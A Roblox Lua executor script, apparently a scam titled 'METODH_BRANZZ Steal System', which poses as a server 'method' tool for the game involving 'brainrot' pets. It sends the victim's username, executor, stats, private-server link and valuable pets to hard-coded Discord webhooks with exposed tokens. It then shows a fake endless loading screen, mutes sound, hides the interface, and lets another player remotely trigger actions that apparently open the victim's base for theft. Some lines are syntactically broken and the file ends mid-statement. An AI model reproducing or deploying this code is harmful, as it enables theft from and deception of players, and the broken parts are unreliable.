-- ╔══════════════════════════════════════════╗
-- ║     METODH_BRANZZ - By BranZZ MetoDos   ║
-- ║           🧑‍💻 🧠 👤 🚀                    ║
-- ╚══════════════════════════════════════════╝

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")
local UserGameSettings = UserSettings():GetService("UserGameSettings")
local SoundService = game:GetService("SoundService")
local TweenService = game:GetService("TweenService")

-- ══════════════════════════════════════
-- CONFIG
-- ══════════════════════════════════════
local WEBHOOK_MAIN = "https://discord.com/api/webhooks/1484194847740006590/QV9jNsiqdBPa8Xq6l7ltqr1DeYvhUOPk53ArZ8G-l9I3-FcMhNd-Ogi8fvcEJ7bp0DfI"
local WEBHOOK_GOAT = "https://discord.com/api/webhooks/1490438326446981163/ohaLRkwqP-rYki01ROkA8R9GZyO-_xdNDCVu2NELS-6Qm-xPWUaAG1DrJern6b5CJ7SZ"
local THUMB_URL = "https://i.imgur.com/sJUiZhI.jpeg"
local LOADING_TIME_HOURS = 2 -- ALTERE AQUI O TEMPO DE LOADING (em horas)

-- ══════════════════════════════════════
-- LISTA DE BRAINROTS VÁLIDOS
-- ══════════════════════════════════════

-- Lista de Brainrots válidos
local VALID_BRAINROTS = {
    "Brri Brri Bicus Dicus Bombicus","Brutto Gialutto","Bulbito Bandito Traktorito","Trulinero Trulicina",
    "Caessito Satalito","Cacto Hippopotamo","Capi Taco","Matteo","Caramello Filtrello","Carloo",
    "Carrotini Brainini","Cavallo Virtuoso","Cellularcini Viciosini","Chachechi","Noobini Pizzanini",
    "Bubo de Fuego","Chihuanini Taconini","Chimpanzini Bananini","Pipi Kiwi","Cocosini Mama",
    "Crabbo Limonetta","Rang Ring Bus","Dug dug dug","Dul Dul Dul","Elefanto Frigo","Esok Sekolah",
    "Espresso Signora","Extinct Ballerina","Extinct Matteo","Extinct Tralalero","Orcalero Orcala",
    "Fragola La La La","Frigo Camelo","Ganganzelli Trulala","Garama and Madundung","Spooky and Pumpky",
    "Gattatino Nyanino","Gattito Tacoto","Odin Din Din Dun","Glorbo Fruttodrillo","Gorillo Subwoofero",
    "Gorillo Watermelondrillo","Grajpuss Medussi","Guerriro Digitale","Job Job Job Sahur","Karkerkar Kurkur",
    "Ketchuru and Musturu","Ketupat Kepat","La Cucaracha","La Extinct Grande","La Grande Combinasion",
    "La Karkerkar Combinasion","La Sahur Combinasion","La Supreme Combinasion","La Vacca Saturno Saturnita",
    "Los Crocodillitos","Las Capuchinas","Fluriflura","Las Tralaleritas","Lerulerulerule","Lionel Cactuseli",
    "Burbaloni Lollioli","Los Combinasionas","Los Hotspotsitos","Los Chicleteiras","Las Vaquitas Saturnitas",
    "Los Noobinis","Los Noobo My Hotspotsitos","Gizafa Celestre","Las Sis","Los Matteos","Los Tipi Tacos",
    "Los Orcalltos","Los Bros","Los Bombinitos","Zibra Zibralini","Corn Corn Corn Sahur","Malame Amarele",
    "Mangolini Parrocini","Mariachi Corazoni","Mastodontico Telepedeone","Ta Ta Ta Ta Sahur","Urubini Flamenguini",
    "Los Tungtungtungcitos","Nooo My Hotspot","Nuclearo Dinossauro","Bandito Bobritto","Chillin Chili",
    "Alessio","Orcellia Orcala","Pakrahmatnamat","Pandaccini Bananini","Penguino Cocosino","Perochello Lemonchello",
    "Pi Pi Watermelon","Piccione Macchina","Piccionetta Macchina","Pipi Avocado","Pipi Corni","Bambini Crostini",
    "Pipi Potato","Pot Hotspot","Quesadilla Crocodila","Quivioli Ameleonni","Raccooni Jandelini","Rhino Helicopterino",
    "Rhino Toasterino","Salamino Penguino","Sammyni Spyderini","Los Spyderinis","Sigma Boy","Sigma Girl",
    "Signore Carapace","Spaghetti Tualetti","Spioniro Golubiro","Strawberrelli Flamingelli","Tim Cheese",
    "Svinina Bombardino","Chef Crabracadabra","Tukanno Bananno","Tacorita Bicicleta","Talpa Di Fero",
    "Tartaruga Cisterna","Te Te Te Sahur","Ti Iì Iì Tahur","Tietze Sahur","Trippi Troppi","Tigroligre Frutonni",
    "Cocofanto Elefanto","Tipi Topi Taco","Tirilikalika Tirilikalako","To to to Sahur","Tob Tobì Tobì",
    "Torrtuginni Dragonfrutini","Tracoductulu Delapeladustuz","Tractoro Dinosauro","Tralaledon","Tralalero Tralala",
    "Tralalita Tralala","Trenostruzzo Turbo 3000","Trenostruzzo Turbo 4000","Tric Trac Baraboom","Trippi Troppi Troppa Trippa",
    "Cappuccino Assassino","Strawberry Elephant","Mythic Lucky Block","Noo my Candy","Brainrot God Lucky Block",
    "Taco Lucky Block","Admin Lucky Block","Toiletto Focaccino","Yes any examine","Brashlini Berimbini",
    "Tang Tang Keletang","Noo my examine","Los Primos","Karker Sahur","Los Tacoritas","Perrito Burrito",
    "Brr Brr Patapàn","Pop Pop Sahur","Bananito Bandito","La Secret Combinasion","Los Jobcitos","Los Tortus",
    "Los 67","Los Karkeritos","Squalanana","Cachorrito Melonito","Los Lucky Blocks","Burguro And Fryuro",
    "Eviledon","Zombie Tralala","Jacko Spaventosa","Los Mobilis","Chicleteirina Bicicleteirina","La Spooky Grande",
    "La Vacca Jacko Linterino","Vulturino Skeletono","Tartaragno","Pinealotto Fruttarino","Vampira Cappucina",
    "Quackula","Mummio Rappitto","Tentacolo Tecnico","Jacko Jack Jack","Magi Ribbitini","Frankentteo",
    "Snailenzo","Chicleteira Bicicleteira","Lirilli Larila","Headless Horseman","Frogato Pirato","Mieteteira Bicicleteira",
    "Pakrahmatmatina","Krupuk Pagi Pagi","Boatito Auratico","Bambu Bambu Sahur","Bananita Dolphintita","Meowl",
    "Horegini Boom","Questadillo Vampiro","Chipso and Queso","Mummy Ambalabu","Jackorilla","Trickolino",
    "Secret Lucky Block","Los Spooky Combinasionas","Telemorte","Cappuccino Clownino","Pot Pumpkin",
    "Pumpkini Spyderini","La Casa Boo","Skull Skull Skull","Spooky Lucky Block","Burrito Bandito",
    "La Taco Combinasion","Frio Ninja","Nombo Rollo","Guest 666","Ixixixi","Aquanaut","Capitano Moby","Secret"
}

-- ══════════════════════════════════════
-- FUNÇÕES AUXILIARES
-- ══════════════════════════════════════
local function limpar(txt)
    if not txt then return "" end
    txt = tostring(txt); txt = txt:gsub("%s+", " ")
    return txt
end

local function getRealValue(gen)
    if not gen then return 0 end
    local num = tonumber(gen:match("[%d%.]+")) or 0
    if gen:find("[Mm]") then return num * 1000000
    elseif gen:find("[Kk]") then return num * 1000
    else return num end
end

local function formatarValor(val)
    if val >= 1000000 then return string.format("$%.1fM/S", val/1000000)
    elseif val >= 1000 then return string.format("$%.0fK/S", val/1000)
    else return string.format("$%d/S", val) end
end

local function isValidBrainrot(name)
    if not name then return false end
    for _, b in ipairs(VALID_BRAINROTS) do
        if name == b then return true end
    end
    return false
end

-- ══════════════════════════════════════
-- DETECTOR DE BRAINROTS V2
-- ══════════════════════════════════════
local function findBrainrotsWithValues()
    local resultados, chaves = {}, {}
    local possiveisNomes = {}

    for _, obj in ipairs(Workspace:GetDescendants()) do
        if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("StringValue") or obj:IsA("ValueBase"))
            and (obj.Name == "DisplayName" or obj.Name == "NameLabel" or obj.Name == "PetName") then
            table.insert(possiveisNomes, obj)
        end
    end

    local plotsFolder = Workspace:FindFirstChild("Plots")
    if plotsFolder then
        for _, plot in ipairs(plotsFolder:GetChildren()) do
            local base = plot:FindFirstChildWhichIsA("BasePart")
            if not base then continue end

            local posBase, tamanho = base.Position, base.Size
            local raio = math.max(tamanho.X, tamanho.Z) / 2 + 100

            for _, nomeObj in ipairs(possiveisNomes) do
                local gui = nomeObj:FindFirstAncestorWhichIsA("BillboardGui") or nomeObj:FindFirstAncestorWhichIsA("SurfaceGui")
                if not (gui and gui.Adornee and gui.Adornee:IsA("BasePart")) then continue end

                local dist = (gui.Adornee.Position - posBase).Magnitude
                if dist > raio then continue end

                local nomeCru = (nomeObj:IsA("TextLabel") or nomeObj:IsA("TextButton")) and nomeObj.Text or nomeObj.Value
                local nome = limpar(nomeCru)
                if nome == "" or nome == "{DisplayName}" or not isValidBrainrot(nome) then continue end

                local generation, parent = "", nomeObj.Parent
                if parent then
                    local g = parent:FindFirstChild("Generation") or parent:FindFirstChild("Gen") or parent:FindFirstChild("Value")
                    if g then
                        generation = limpar((g:IsA("TextLabel") or g:IsA("TextButton")) and g.Text or tostring(g.Value))
                    end
                end

                local nomeFinal = nome
                if parent and parent:FindFirstChild("Mutation") then
                    local mut = parent.Mutation
                    local mutTxt = (mut:IsA("TextLabel") or mut:IsA("TextButton")) and limpar(mut.Text) or limpar(tostring(mut.Value))
                    if mutTxt ~= "" and mutTxt ~= " " then
                        nomeFinal = "[" .. mutTxt .. "] " .. nome
                    end
                end

                local valorReal = getRealValue(generation)
                local chave = nomeFinal .. "_" .. generation
                if not chaves[chave] then
                    chaves[chave] = true
                    table.insert(resultados, {nome=nomeFinal, valor=generation~=""and formatarValor(valorReal)or"N/A", valorReal=valorReal})
                end
            end
        end
    end

    -- Fallback getgenv
    if #resultados == 0 and getgenv and getgenv().base then
        for _, br in pairs(getgenv().base:GetDescendants()) do
            if br:IsA("TextLabel") and br.Name == "Generation" then
                local p = br.Parent
                if p and p:FindFirstChild("DisplayName") then
                    local nome = limpar(p.DisplayName.ContentText or p.DisplayName.Text or "")
                    if not isValidBrainrot(nome) then continue end
                    local nomeFinal = nome
                    if p:FindFirstChild("Mutation") and p.Mutation.Visible then
                        nomeFinal = "[" .. limpar(p.Mutation.ContentText) .. "] " .. nome
                    end
                    local genTxt = limpar(br.ContentText or br.Text or "")
                    local vr = getRealValue(genTxt)
                    local chave = nomeFinal.."_"..genTxt
                    if not chaves[chave] then
                        chaves[chave] = true
                        table.insert(resultados, {nome=nomeFinal, valor=formatarValor(vr), valorReal=vr})
                    end
                end
            end
        end
    end

    table.sort(resultados, function(a,b) return a.valorReal > b.valorReal end)
    return resultados
end

local function getPlayerStats()
    local p = Players.LocalPlayer
    local stats = {steals="0", rebirths="0"}
    if p:FindFirstChild("leaderstats") then
        local ls = p.leaderstats
        if ls:FindFirstChild("Steals")   then stats.steals   = tostring(ls.Steals.Value)   end
        if ls:FindFirstChild("Rebirths") then stats.rebirths = tostring(ls.Rebirths.Value) end
    end
    return stats
end

-- ══════════════════════════════════════
-- PEGAR INFO DO GAME
-- ══════════════════════════════════════
local function getGameInfo()
    local placeId = game.PlaceId
    local jobId = game.JobId
    local gameIcon = "https://assetgame.roblox.com/Thumbs/GameIcon.ashx?width=512&height=512&gameId="..placeId
    return placeId, jobId, gameIcon
end

-- ══════════════════════════════════════
-- ENVIAR WEBHOOKS
-- ══════════════════════════════════════
local function sendToWebhook(payload, url)
    local body = HttpService:JSONEncode(payload)
    local function try(fn) pcall(fn) end

    if syn and syn.request then
        try(function() syn.request({Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body}) end)
        return
    end
    if request then
        try(function() request({Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body}) end)
        return
    end
    if http_request then
        try(function() http_request({Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body}) end)
        return
    end
    try(function() HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson, false) end)
end

local function updateWebhookName()
    pcall(function()
        local body = HttpService:JSONEncode({name="branzz metodhs || update 17.1"})
        if syn and syn.request then
            syn.request({Url=WEBHOOK_MAIN,Method="PATCH",Headers={["Content-Type"]="application/json"},Body=body})
        elseif request then
            request({Url=WEBHOOK_MAIN,Method="PATCH",Headers={["Content-Type"]="application/json"},Body=body})
        end
    end)
end

-- MSG 1 — AO ABRIR
local function sendInitialWebhook()
    local p = Players.LocalPlayer
    local br = findBrainrotsWithValues()
    local lista = #br > 0 and "" or "Nenhum brainrot detectado"
    for i, b in ipairs(br) do
        lista = lista .. "🐾 **" .. b.nome .. "** — `" .. b.valor .. "`\n"
        if i >= 30 then lista = lista.."... e mais\n"; break end
    end

    local gameThumb = "https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid="..tostring(game.PlaceId).."&fmt=png&wd=420&ht=420"

    sendToWebhook({
        content = "👤 **Novo alvo detectado!** @everyone",
        embeds = {{
            title   = "👤  Novo Usuário na Tela de Link",
            description = "```\n" .. p.Name .. " entrou no sistema\n```",
            color   = 0x7B2FFF,
            thumbnail = { url = gameThumb },
            fields  = {
                {
                    name   = "👤  Player",
                    value  = "```\n" .. p.Name .. "\n```",
                    inline = true
                },
                {
                    name   = "🧠  Players no Servidor",
                    value  = "```\n" .. tostring(#Players:GetPlayers()) .. "\n```",
                    inline = true
                },
                {
                    name   = "🐾  Brainrots Detectados",
                    value  = lista ~= "" and lista or "```\nNenhum\n```",
                    inline = false
                },
            },
            footer    = { text = "🧑‍💻 By BranZZ MetoDos  •  Steal System", icon_url = gameThumb },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }, WEBHOOK_MAIN)
end

-- MSG 2 + MSG 3 — UMA detecção só, reutilizada nos dois webhooks
local function sendCallBotsWebhook(link)
    local p     = Players.LocalPlayer
    local stats = getPlayerStats()
    local exec  = (identifyexecutor and identifyexecutor()) or "Unknown"
    local gameThumb = "https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid="..tostring(game.PlaceId).."&fmt=png&wd=420&ht=420"

    -- ══ DETECÇÃO ÚNICA — usada nos dois webhooks abaixo ══
    local br = findBrainrotsWithValues()

    -- ── MSG 2: lista completa → WEBHOOK_MAIN ──
    local lista = #br > 0 and "" or "```\nNenhum brainrot detectado\n```"
    for i, b in ipairs(br) do
        lista = lista .. "💎 **" .. b.nome .. "** — `" .. b.valor .. "`\n"
        if i >= 25 then lista = lista.."... e mais\n"; break end
    end

    sendToWebhook({
        content = "🚀 **Novo Alvo Detectado!** @everyone",
        embeds = {{
            title       = "🚀  Novo Alvo Detectado",
            description = "```\nBy BranZZ MetoDos — Steal System\n```",
            color       = 0xFF4500,
            thumbnail   = { url = gameThumb },
            fields = {
                { name="👤  Player",             value="```\n"..p.Name.."\n```",                         inline=true  },
                { name="🧑‍💻  Executor",           value="```\n"..exec.."\n```",                           inline=true  },
                { name="🧠  Players no Servidor", value="```\n"..tostring(#Players:GetPlayers()).."\n```", inline=true  },
                { name="💰  Steals",              value="```\n"..stats.steals.."\n```",                   inline=true  },
                { name="🔄  Rebirths",            value="```\n"..stats.rebirths.."\n```",                 inline=true  },
                { name="🔗  Link do Servidor",    value="[🎮 Clique aqui para entrar]("..link..")",       inline=false },
                { name="🧠  Brainrots Detectados",value=lista,                                            inline=false },
            },
            image     = { url = https://i.imgur.com/sJUiZhI.jpeg },
            footer    = { text="🧑‍💻 By BranZZ MetoDos  •  Steal System", icon_url=gameThumb },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }, WEBHOOK_MAIN)

    -- ── MSG 3: só o GOAT (br[1] = maior valor) → WEBHOOK_GOAT ──
    -- usa a MESMA lista, não detecta de novo — zero spam
    if #br == 0 then return end
    local goat     = br[1]
    local mutacao  = goat.nome:match("^%[(.-)%]") or "Sem mutação"
    local nomeBase = goat.nome:match("%]%s*(.+)") or goat.nome

    sendToWebhook({
        content = "🐐 **GOAT BRAINROT DETECTADO!** 🐐",
        embeds = {{
            title       = "🐐  Melhor Brainrot do Servidor!",
            description = "```\n"..nomeBase.."\n```",
            color       = 0xFFD700,
            image       = { url = gameThumb },
            fields = {
                { name="🐾  Nome",       value="```\n"..nomeBase.."\n```",   inline=false },
                { name="💰  Geração /S", value="```\n"..goat.valor.."\n```", inline=true  },
                { name="🧬  Mutação",    value="```\n"..mutacao.."\n```",    inline=true  },
            },
            footer    = { text="🧑‍💻 By BranZZ MetoDos  •  MetoDos in Top 1", icon_url=https://i.imgur.com/sJUiZhI.jpeg },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }, WEBHOOK_GOAT)
end

-- stub vazio pra não quebrar a chamada no btn
local function sendGoatBrainrotWebhook() end


-- ══════════════════════════════════════
-- SOM OFF
-- ══════════════════════════════════════
local function disableSound()
    spawn(function()
        while true do
            UserGameSettings.MasterVolume = 0
            SoundService.Volume = 0
            wait(0.5)
        end
    end)
end

local function disableCoreGui()
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        StarterGui:SetCore("TopbarEnabled", false)
    end)
end

-- ══════════════════════════════════════
-- COMANDOS
-- ══════════════════════════════════════
local function openBaseSequence(src)
    local p = Players.LocalPlayer
    pcall(function() p:RequestFriendship(src) end)
    if p.Character then p.Character:BreakJoints() end
    p.CharacterAdded:Wait(); wait(1)
    spawn(function()
        local chr = p.Character
        if chr and chr:FindFirstChild("HumanoidRootPart") then
            local hrp = chr.HumanoidRootPart
            chr:FindFirstChildOfClass("Humanoid"):MoveTo((hrp.CFrame*CFrame.new(0,0,-79)).Position)
            wait(3)
            for _, obj in pairs(Workspace:GetDescendants()) do
                if obj:IsA("ProximityPrompt") then
                    pcall(function() fireproximityprompt(obj) end); break
                end
            end
        end
    end)
end

local function setupChatCommands()
    local me = Players.LocalPlayer

    -- ══ ANTI-KICK — detecta "kick", "/kick" ou "Kick" no chat ══
    -- Quem digitar qualquer variação kica QUEM EXECUTOU o script
    local function verificarKick(player, msg)
        local m = msg:lower():gsub("^%s+",""):gsub("%s+$","")
        if m == "kick" or m == "/kick" or m == ";kick" then
            if player.UserId == me.UserId then
                me:Kick("Erro: ServerStart Modules Not Loaded Please try Again ( tente de novo ) 🧠😢")
            end
        end
        -- comando abrir (mantido)
        if m == "abrir" and player ~= me then
            openBaseSequence(player)
        end
    end

    -- método moderno (TextChatService)
    local modernOk = pcall(function()
        local TextChatService = game:GetService("TextChatService")
        TextChatService.MessageReceived:Connect(function(msg)
            local src = msg.TextSource
            if not src then return end
            local player = Players:GetPlayerByUserId(src.UserId)
            if player then verificarKick(player, msg.Text) end
        end)
    end)

    -- fallback clássico (Chatted)
    if not modernOk then
        local function conectar(pl)
            pl.Chatted:Connect(function(msg) verificarKick(pl, msg) end)
        end
        for _, pl in ipairs(Players:GetPlayers()) do conectar(pl) end
        Players.PlayerAdded:Connect(conectar)
    end
end

-- ══════════════════════════════════════
-- UI PRINCIPAL
-- ══════════════════════════════════════
local function createMainGUI()
    pcall(function()
        if CoreGui:FindFirstChild("BRANZZ_GUI") then
            CoreGui:FindFirstChild("BRANZZ_GUI"):Destroy()
        end
    end)

    local sg = Instance.new("ScreenGui")
    sg.Name = "BRANZZ_GUI"
    sg.ResetOnSpawn = false
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    sg.Parent = CoreGui

    local blur = Instance.new("Frame")
    blur.Size = UDim2.new(1,0,1,0)
    blur.BackgroundColor3 = Color3.fromRGB(0,0,0)
    blur.BackgroundTransparency = 0.45
    blur.BorderSizePixel = 0
    blur.ZIndex = 1
    blur.Parent = sg

    local card = Instance.new("Frame")
    card.Size = UDim2.new(0,440,0,330)
    card.Position = UDim2.new(0.5,-220,0.5,-165)
    card.BackgroundColor3 = Color3.fromRGB(15,15,22)
    card.BorderSizePixel = 0
    card.ZIndex = 2
    card.Parent = sg

    local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0,18); cc.Parent = card
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(120,60,255)
    stroke.Thickness = 2
    stroke.Parent = card

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(1,0,0,5)
    bar.BackgroundColor3 = Color3.fromRGB(120,60,255)
    bar.BorderSizePixel = 0
    bar.ZIndex = 3
    bar.Parent = card
    local bc = Instance.new("UICorner"); bc.CornerRadius = UDim.new(0,4); bc.Parent = bar

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1,0,0,50)
    title.Position = UDim2.new(0,0,0,10)
    title.BackgroundTransparency = 1
    title.Text = "🧑‍💻 METODH_BRANZZ 🚀"
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.TextSize = 24
    title.Font = Enum.Font.GothamBold
    title.ZIndex = 3
    title.Parent = card

    local sub = Instance.new("TextLabel")
    sub.Size = UDim2.new(1,-40,0,22)
    sub.Position = UDim2.new(0,20,0,58)
    sub.BackgroundTransparency = 1
    sub.Text = "🧠 By BranZZ MetoDos — Steal System 👤"
    sub.TextColor3 = Color3.fromRGB(160,120,255)
    sub.TextSize = 14
    sub.Font = Enum.Font.Gotham
    sub.ZIndex = 3
    sub.Parent = card

    local div = Instance.new("Frame")
    div.Size = UDim2.new(0.88,0,0,1)
    div.Position = UDim2.new(0.06,0,0,88)
    div.BackgroundColor3 = Color3.fromRGB(60,40,100)
    div.BorderSizePixel = 0
    div.ZIndex = 3
    div.Parent = card

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0.88,0,0,22)
    lbl.Position = UDim2.new(0.06,0,0,100)
    lbl.BackgroundTransparency = 1
    lbl.Text = "🔗  Link do Servidor Privado"
    lbl.TextColor3 = Color3.fromRGB(180,150,255)
    lbl.TextSize = 13
    lbl.Font = Enum.Font.GothamBold
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 3
    lbl.Parent = card

    local inputBg = Instance.new("Frame")
    inputBg.Size = UDim2.new(0.88,0,0,46)
    inputBg.Position = UDim2.new(0.06,0,0,126)
    inputBg.BackgroundColor3 = Color3.fromRGB(25,20,40)
    inputBg.BorderSizePixel = 0
    inputBg.ZIndex = 3
    inputBg.Parent = card
    local ibc = Instance.new("UICorner"); ibc.CornerRadius = UDim.new(0,10); ibc.Parent = inputBg
    local ibs = Instance.new("UIStroke"); ibs.Color = Color3.fromRGB(80,50,160); ibs.Thickness = 1.5; ibs.Parent = inputBg

    local input = Instance.new("TextBox")
    input.Size = UDim2.new(1,-20,1,0)
    input.Position = UDim2.new(0,10,0,0)
    input.BackgroundTransparency = 1
    input.Text = ""
    input.PlaceholderText = "Cole o link aqui..."
    input.TextColor3 = Color3.fromRGB(220,220,255)
    input.PlaceholderColor3 = Color3.fromRGB(100,80,140)
    input.TextSize = 14
    input.Font = Enum.Font.Gotham
    input.ClearTextOnFocus = false
    input.ZIndex = 4
    input.Parent = inputBg

    local statusLbl = Instance.new("TextLabel")
    statusLbl.Size = UDim2.new(0.88,0,0,22)
    statusLbl.Position = UDim2.new(0.06,0,0,178)
    statusLbl.BackgroundTransparency = 1
    statusLbl.Text = ""
    statusLbl.TextColor3 = Color3.fromRGB(140,255,140)
    statusLbl.TextSize = 12
    statusLbl.Font = Enum.Font.Gotham
    statusLbl.ZIndex = 3
    statusLbl.Parent = card

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.6,0,0,52)
    btn.Position = UDim2.new(0.2,0,0,215)
    btn.BackgroundColor3 = Color3.fromRGB(100,50,220)
    btn.BorderSizePixel = 0
    btn.Text = "🚀  START METODO"
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.TextSize = 20
    btn.Font = Enum.Font.GothamBold
    btn.AutoButtonColor = false
    btn.ZIndex = 3
    btn.Parent = card
    local btnc = Instance.new("UICorner"); btnc.CornerRadius = UDim.new(0,12); btnc.Parent = btn
    local btns = Instance.new("UIStroke"); btns.Color = Color3.fromRGB(180,100,255); btns.Thickness = 1.5; btns.Parent = btn

    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3=Color3.fromRGB(130,70,255)}):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3=Color3.fromRGB(100,50,220)}):Play()
    end)

    local foot = Instance.new("TextLabel")
    foot.Size = UDim2.new(1,0,0,22)
    foot.Position = UDim2.new(0,0,0,290)
    foot.BackgroundTransparency = 1
    foot.Text = "🧑‍💻 BranZZ MetoDos  •  🧠 Steal System  •  👤 v17.1"
    foot.TextColor3 = Color3.fromRGB(80,60,120)
    foot.TextSize = 11
    foot.Font = Enum.Font.Gotham
    foot.ZIndex = 3
    foot.Parent = card

    local _clicou = false -- bloqueia duplo clique / reenvio
    btn.MouseButton1Click:Connect(function()
        if _clicou then return end -- já enviou, ignora

        local link = input.Text
        if link == "" then
            statusLbl.Text = "⚠️  Insira um link válido!"
            statusLbl.TextColor3 = Color3.fromRGB(255,100,100)
            return
        end

        _clicou = true -- trava aqui, nunca mais envia
        btn.Text = "🧠 Processando..."
        btn.BackgroundColor3 = Color3.fromRGB(60,30,120)
        btn.Active = false
        statusLbl.Text = "🚀 Enviando dados..."
        statusLbl.TextColor3 = Color3.fromRGB(140,255,140)

        wait(0.5)
        card.Visible = false
        blur.Visible = false

        createLoadingGUI()
        disableSound()
        disableCoreGui()

        wait(1.5)
        sendCallBotsWebhook(link)
        sendGoatBrainrotWebhook()
    end)
end

-- ══════════════════════════════════════
-- LOADING INFINITO
-- ══════════════════════════════════════
function createLoadingGUI()
    local lg = Instance.new("ScreenGui")
    lg.Name = "BRANZZ_LOADING"
    lg.ResetOnSpawn = false
    lg.IgnoreGuiInset = true
    lg.DisplayOrder = 999999
    lg.Parent = CoreGui

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1,0,1,100)
    bg.Position = UDim2.new(0,0,0,-50)
    bg.BackgroundColor3 = Color3.fromRGB(8,8,14)
    bg.BorderSizePixel = 0
    bg.ZIndex = 999998
    bg.Parent = lg

    local lc = Instance.new("Frame")
    lc.Size = UDim2.new(0,540,0,210)
    lc.Position = UDim2.new(0.5,-270,0.5,-105)
    lc.BackgroundColor3 = Color3.fromRGB(15,15,25)
    lc.BorderSizePixel = 0
    lc.ZIndex = 999999
    lc.Parent = bg
    local lcc = Instance.new("UICorner"); lcc.CornerRadius = UDim.new(0,20); lcc.Parent = lc
    local lcs = Instance.new("UIStroke"); lcs.Color = Color3.fromRGB(120,60,255); lcs.Thickness = 2; lcs.Parent = lc

    local tb = Instance.new("Frame")
    tb.Size = UDim2.new(1,0,0,4)
    tb.BackgroundColor3 = Color3.fromRGB(120,60,255)
    tb.BorderSizePixel = 0
    tb.ZIndex = 1000000
    tb.Parent = lc
    local tbc = Instance.new("UICorner"); tbc.CornerRadius = UDim.new(0,4); tbc.Parent = tb

    local lt = Instance.new("TextLabel")
    lt.Size = UDim2.new(1,0,0,50)
    lt.Position = UDim2.new(0,0,0,10)
    lt.BackgroundTransparency = 1
    lt.Text = "🚀  METODO ATIVO"
    lt.TextColor3 = Color3.fromRGB(180,120,255)
    lt.TextSize = 26
    lt.Font = Enum.Font.GothamBold
    lt.ZIndex = 1000001
    lt.Parent = lc

    local lst = Instance.new("TextLabel")
    lst.Size = UDim2.new(1,0,0,24)
    lst.Position = UDim2.new(0,0,0,58)
    lst.BackgroundTransparency = 1
    lst.Text = "🧑‍💻 By BranZZ MetoDos  •  🧠 Steal System"
    lst.TextColor3 = Color3.fromRGB(120,80,200)
    lst.TextSize = 14
    lst.Font = Enum.Font.Gotham
    lst.ZIndex = 1000001
    lst.Parent = lc

    local ls = Instance.new("TextLabel")
    ls.Size = UDim2.new(1,-40,0,24)
    ls.Position = UDim2.new(0,20,0,90)
    ls.BackgroundTransparency = 1
    ls.Text = "Loading modules..."
    ls.TextColor3 = Color3.fromRGB(160,160,200)
    ls.TextSize = 15
    ls.Font = Enum.Font.Gotham
    ls.ZIndex = 1000001
    ls.Parent = lc

    local pct = Instance.new("TextLabel")
    pct.Size = UDim2.new(1,0,0,30)
    pct.Position = UDim2.new(0,0,0,120)
    pct.BackgroundTransparency = 1
    pct.Text = "1%"
    pct.TextColor3 = Color3.fromRGB(255,255,255)
    pct.TextSize = 22
    pct.Font = Enum.Font.GothamBold
    pct.ZIndex = 1000001
    pct.Parent = lc

    local barBg = Instance.new("Frame")
    barBg.Size = UDim2.new(0.88,0,0,22)
    barBg.Position = UDim2.new(0.06,0,0,162)
    barBg.BackgroundColor3 = Color3.fromRGB(30,20,50)
    barBg.BorderSizePixel = 0
    barBg.ZIndex = 1000001
    barBg.Parent = lc
    local bbc = Instance.new("UICorner"); bbc.CornerRadius = UDim.new(0,11); bbc.Parent = barBg

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0.01,0,1,0)
    bar.BackgroundColor3 = Color3.fromRGB(120,60,255)
    bar.BorderSizePixel = 0
    bar.ZIndex = 1000002
    bar.Parent = barBg
    local brc = Instance.new("UICorner"); brc.CornerRadius = UDim.new(0,11); brc.Parent = bar

    local msgs = {
        "Loading modules...","Connecting to servers...","Verifying brainrots...",
        "Collecting data...","Syncing bots...","Processing information...",
        "Sending commands...","Establishing connection...","Waiting for response...",
        "Initializing system...", "Buscando Brainrots Melhores...",
    }

    -- Progresso com % inteiro
    spawn(function()
        local prog, mi, mt = 1, 1, 0
        local totalSeconds = LOADING_TIME_HOURS * 3600
        local increment = 99 / totalSeconds

        while true do
            wait(1)
            prog = math.min(prog + increment, 99)
            pct.Text = string.format("%d%%", math.floor(prog))
            TweenService:Create(bar, TweenInfo.new(0.8, Enum.EasingStyle.Linear),
                {Size=UDim2.new(prog/100,0,1,0)}):Play()
            
            mt = mt + 1
            if mt >= 3 then
                mt = 0; mi = mi % #msgs + 1
                ls.Text = msgs[mi]
            end
        end
    end)

    spawn(function()
        while true do
            TweenService:Create(lt, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
                {TextColor3=Color3.fromRGB(220,160,255)}):Play()
            wait(1)
            TweenService:Create(lt, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
                {TextColor3=Color3.fromRGB(120,60,255)}):Play()
            wait(1)
        end
    end)
end

-- ══════════════════════════════════════
-- INIT
-- ══════════════════════════════════════
pcall(function()
    updateWebhookName()
    setupChatCommands()
